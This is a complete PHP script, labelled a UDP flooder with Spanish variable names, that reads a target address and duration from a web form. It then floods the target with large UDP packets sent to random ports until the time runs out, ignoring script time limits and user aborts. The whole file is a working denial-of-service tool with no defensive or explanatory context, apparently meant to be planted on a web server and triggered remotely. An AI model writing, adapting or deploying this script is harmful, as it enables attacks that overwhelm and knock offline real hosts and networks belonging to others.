<?php

//UDP flooder

$target=$_POST['target'];
$tiempo=$_POST['time'];

//udp flood

function udpflood($target, $tiempo){
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $reloj=time()+$tiempo;
    $paquetes=0;
    for($d=0;$d<65000;$d++){
            $data .= 'RB';
    }
    while(1) {
        $port=rand(1,65535);  
        if(time() > $reloj) {
            break;
}               
        $socket=fsockopen("udp://".$target, $port);
        if (!$socket) {
            break;
}
        else {

            fwrite($socket, $data);
            fclose($socket);
            $paquetes++;
    
       
}
}
    echo $paquetes." paquetes enviados en ".$tiempo." segundos";
}    

//fin function udp flood


//attack

if(isset($_POST['start']) && isset($target) && isset($tiempo)){
    udpflood($target, $tiempo);   
}

?>


